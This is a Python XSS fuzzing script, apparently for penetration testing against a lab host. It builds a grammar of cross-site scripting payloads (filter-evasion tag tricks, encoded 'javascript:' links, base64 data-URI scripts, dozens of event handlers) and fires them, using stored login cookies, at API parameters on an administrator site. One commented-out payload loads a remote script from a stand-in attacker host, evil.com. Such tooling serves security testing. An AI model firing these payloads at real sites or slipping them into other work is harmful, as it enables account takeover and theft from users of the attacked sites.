# basic_fuzzer_sample.py

from fuzzingbook.Grammars import Grammar, is_valid_grammar
from fuzzingbook.GrammarFuzzer import GrammarFuzzer
import random
from colorama import Fore, Style, init
import json
import os, sys
sys.path.append(os.path.dirname(os.path.dirname(__file__)))
from modules.requests_handler import ApiSessionHandler
init(autoreset=True)
# --- 1. 定義一個簡單的數學運算語法 ---
# basic_fuzzer_sample.py 修正後的 XSS 語法


"""
# 
<select>
<math>
<form>
<frameset>
<marquee>
<style>

# 這
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
src=xxx:x
src="about:blank"
%3C
%3E
`
;
<svg><image href="x" onerror="alert(1)"></image></svg>
<svg>
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
'"<<Scrip<script> ;
<audio>
<video>
<input>
<body>
<div>
<object>
<iframe>
<embed>

"""
XSS_GRAMMAR: Grammar = {
    "<start>": ["<script>", "<ImageTags>", "<alink>", "<media>", "<input>", "<normal>", "<ContextChange>"],
    
    # ; ' " ` < > %3E %3C  -->
    "<SpecialCharFronts>":[
        ";<",
        "\x00<",
        "'<",
        '"<',
        '`<',
        '<<',
        '<',
        '><',
        '>><',
        '%3E<',
        '%3C<',
        '--><!-- ---><',
        '--<'
    ],
    "<SpecialCharBacks>":[
        '>;',
        '>\x00',
        ">'",
        '>"',
        '>`',
        '><',
        '>>',
    ],
    "<typo>": [
        "text",
        "textarea",
        "select",
        "radio",
        "checkbox",
        "file",
        "password",
        "email",
        "url",
        "tel",
        "number",
        "date",
        "time",
        "datetime-local",
        "month",
        "week",
        "color",
        "hidden",
        "image",
        "submit",
        "button",
        "reset",
        "search",
        "tel",
        "url",
    ],

    "<ContextChange>": [
        '<SpecialCharFronts>object data=<ContextData> <trace_tag> <object<SpecialCharBacks>',
        '<SpecialCharFronts>object data=<ContextData> <event>=<fire>> <trace_tag> <Object<SpecialCharBacks>',
        '<SpecialCharFronts>iframe src=<ContextData> <event>=<fire>> <trace_tag> <iframe<SpecialCharBacks>',
        '<SpecialCharFronts>iframe src=<ContextData>> <trace_tag> <iframe<SpecialCharBacks>',
        '<SpecialCharFronts>embed src=<ContextData>> <trace_tag> <embed<SpecialCharBacks>',
        '<SpecialCharFronts>embed src=<ContextData> <event>=<fire>> <trace_tag> <embed<SpecialCharBacks>',
    ],

    "<escape>": [
        '<'
    ],
    
    "<ContextData>": [
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg" type="text/html',
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgxMTEpPC9zY3JpcHQ+" type="text/html',
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgyMjIpPC9zY3JpcHQ+" type="text/html',
        '"data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMzMzKTwvc2NyaXB0Pg==" type="text/html',
        '"data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZyg1KTwvc2NyaXB0Pg==" type="text/html',
        '"data:text/html;base64,PHNjcmlwdD5vcGVuKDk5KTwvc2NyaXB0Pg==" type="text/html',
        '"data:text/html,<escape>script><fire><escape>/script>" type="text/html',
        '"data:application/xml,<ImageTags>" type="application/xml',
        '"data:text/html,<escape>script><fire><escape>/script>" type="text/html',
    ],

    "<input>": [
        '<SpecialCharFronts>input type=<typo> <event>=<fire><SpecialCharBacks>',
        '<SpecialCharFronts>Input type=<typo> <event>=<fire><SpecialCharBacks>',
        '<SpecialCharFronts>INPUT type=<typo> <event>=<fire><SpecialCharBacks>',
    ],

    "<normal>": [
        "<SpecialCharFronts>body <event>=<fire>> <trace_tag>  </body<SpecialCharBacks>",
        "<SpecialCharFronts>Body <event>=<fire>> <trace_tag> </Body<SpecialCharBacks>",
        "<SpecialCharFronts>BODY <event>=<fire>> <trace_tag> </BODY<SpecialCharBacks>",
        "<SpecialCharFronts>div <event>=<fire>> <trace_tag> </div<SpecialCharBacks>",
        "<SpecialCharFronts>Div <event>=<fire>> <trace_tag> </Div<SpecialCharBacks>",
        "<SpecialCharFronts>DIV <event>=<fire>> <trace_tag> </DIV<SpecialCharBacks>",
    ],


    "<script>" :[
        '<SpecialCharFronts>script> <fire> </Script<SpecialCharBacks>',
        '<SpecialCharFronts>SCript> <fire> </ScRipt<SpecialCharBacks>',
        '<SpecialCharFronts>Scri><SpecialCharFronts>scriPT> <fire> </scriPT<SpecialCharBacks>',
        '<SpecialCharFronts>Script> <fire> </script<SpecialCharBacks>',
        '<SpecialCharFronts>Script> <fire> </script<SpecialCharBacks>',
    ],

    "<alink>": [
        '<SpecialCharFronts>a <href>><trace_tag> </a<SpecialCharBacks>',
        '<SpecialCharFronts>A <href>><trace_tag> </A<SpecialCharBacks>',
    ],
    
    "<ImageTag>": [
        '<SpecialCharFronts>image',
        '<SpecialCharFronts>IMg',
        '<SpecialCharFronts>IMG',
        '<SpecialCharFronts>IMAge',
    ],

    "<ImageTags>": [
        '<SpecialCharFronts>IMg <src_img> <event>=<fire>>',
        '<SpecialCharFronts>IMG <src_img> <event>=<fire>>',
        '<SpecialCharFronts>image <src_img> <event>=<fire>>',
        '<SpecialCharFronts>IMAge <src_img> <event>=<fire>>',
        '<SpecialCharFronts>svg <event>=<fire>> <ImageTag> <href> <event>=<fire>> </svg<SpecialCharBacks>',
        '<SpecialCharFronts>SVG <event>=<fire>> <ImageTag> <href> <event>=<fire>> </SVG<SpecialCharBacks>',
        '<SpecialCharFronts>sVG <event>=<fire>> <ImageTag> <href> <event>=<fire>> </sVG<SpecialCharBacks>',
    ],

    "<href>": [
        'href=x',
        'HRef=javascript:<fire>',
        'href=javascript:<fire>',
        'href=jAVascrIPT:<fire>',
        'href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:<fire>',
        'href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:<fire>',
        'href="javas&#99;ript:<fire>',
    ],

    "<media>" :[
        '<SpecialCharFronts>audio <src_img> <event>=<fire>>',
        '<SpecialCharFronts>video <src_img> <event>=<fire>>',
    ],
    
    "<src_img>":[
        'src',
        'src=<ImageTags>'
        'src=x',
        'src/=/x',
        'src=/xxx:x/',
        'src=about:blank',
    ],
    
    "<fire>": [
        "alert(<trace_tag>)",
        # "Alert(<trace_tag>)",
        "prompt(<trace_tag>)",
        # "Prompt(<trace_tag>)",
        "confirm(<trace_tag>)",
        # "Confirm(<trace_tag>)",
        # "Open(<trace_tag>)",
        "open()",
        "console.log(<trace_tag>)",
        # "Console.log(<trace_tag>)",
        "eval('<fire>')",
        "setTimeout(<fire>,'1000')"
        # "(function(){var s=document.createElement('script');s.src='http://evil.com/xss.js';document.body.appendChild(s);})()"
    ],

    "<event>": [
        "onerror", 
        "onload", 
        "onfocus",
        "onpageshow",
        "oncopy",
        "oncut",
        "onpaste",
        "ontoggle",
        "onwaiting",
        "onvolumechange",
        "ontimeupdate",
        "onsuspend",
        "onstalled",
        "onseeking",
        "onseeked",
        "onratechange",
        "onprogress",
        "onplaying",
        "onplay",
        "onpause",
        "onloadstart",
        "onloadedmetadata",
        "onloadeddata",
        "onended",
        "onemptied",
        "ondurationchange",
        "oncuechange",
        "oncanplaythrough",
        "oncanplay",
        "onabort",
        "draggable=\"true\" onscroll",
        "draggable=\"true\" ondrop",
        "draggable=\"true\" ondragstart",
        "draggable=\"true\" ondragover",
        "draggable=\"true\" ondragleave",
        "draggable=\"true\" ondragenter",
        "draggable=\"true\" ondragend",
        "draggable=\"true\" ondrag",
        "onwheel",
        "onmousewheel", # Deprecatd
        "onmouseup",
        "onmouseover",
        "onmouseout",
        "onmousemove",
        "onmousedown",
        "ondblclick",
        "onclick",
        "onkeyup",
        "onkeypress",
        "onkeydown",
        "onsubmit",
        "onselect",
        "onsearch",
        "onreset",
        "oninvalid",
        "oninput",
        "oncontextmenu",
        "onchange",
        "onblur",
        "onunload",
        "onstorage",
        "onresize",
        "onpopstate",
        "onpagehide",
        "ononline",
        "onoffline",
        "onmessage",
        "onhashchange",
        "onbeforeunload",
        "onbeforeprint",
        "onafterprint"
    ],

    "<trace_tag>": ['a', 'b', 'c', 'ss', 'gg', 'zz', 'ff', 'qq', 'x', '2', 'ak', '911', 'por', 'sche', 'zqw'] 
}

def generatePayload(): 
    xss_fuzzer = GrammarFuzzer(XSS_GRAMMAR)
    return xss_fuzzer.fuzz()

def GetLoginSession():
    with open(ResourcesPool + "LoginSession.json", "r", encoding="utf-8") as f:
        return json.load(f)

def LoginCheck(LoginSession):
    RequestHandler = ApiSessionHandler(LoginSession["Cookies"])
    res = RequestHandler.SendApiRequest("get", "http://192.168.11.129:8080/administrator/", None, None)
    if len(res.text) > 30000:
        print(f"{Fore.GREEN}Login Success{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Login Failed{Style.RESET_ALL}")

ResourcesPool = "../ResourcesPool/"

if __name__ == '__main__':
    LoginSession = GetLoginSession()
    LoginCheck(LoginSession)
    requestHandler = ApiSessionHandler(LoginSession["Cookies"])
    hashes = {}
    with open(ResourcesPool + "hashToApi.json", "r", encoding="utf-8") as f:
        hashes = json.load(f)
    for k, v in hashes.items():
        # print(v)
        data = hashes[k]['body']
        temp = data
        flag = True
        while flag:
            for i in data:
                if data[i] == "Fuzzable":
                    payload = generatePayload()
                    temp[i] = payload
                    print(f"{Fore.YELLOW}Fuzzing {hashes[k]['url']} Param: {i}{Style.RESET_ALL}")
                    print(payload)
            response = requestHandler.SendApiRequest(hashes[k]['method'].upper(), hashes[k]['url'], hashes[k]['headers'], temp)
            print(response.status_code)
            if response.status_code >= 200 and response.status_code < 400:
                flag = False
            else:
                print(f"{Fore.RED}Retrying... Status Code: {response.status_code}{Style.RESET_ALL}")